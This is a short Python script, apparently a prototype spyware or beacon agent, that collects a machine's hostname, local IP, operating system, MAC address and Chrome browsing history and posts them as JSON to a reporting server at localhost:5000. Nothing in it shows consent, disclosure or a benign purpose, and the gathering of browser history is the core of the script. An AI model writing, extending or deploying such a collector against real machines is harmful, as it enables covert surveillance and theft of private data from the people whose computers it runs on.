import socket
import time
import json
import requests
import platform
import uuid
from browser_utils import get_chrome_history

SERVER_URL = "http://localhost:5000/report"

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except:
        ip = "0.0.0.0"
    return ip

print("[DEBUG] IP Address:", get_ip())

def get_basic_info():
    return {
        "hostname": socket.gethostname(),
        "ip_address": get_ip(),
        "os": platform.system(),
        "os_version": platform.version(),
        "mac": hex(uuid.getnode()),
        "browser_history": get_chrome_history()
    }

try:
    data = get_basic_info()
    print("[*] Sending data to server:", data)
    response = requests.post(SERVER_URL, json=data)
    print("[*] Server Response:", response.json())
except Exception as e:
    print("[!] Error sending data:", e)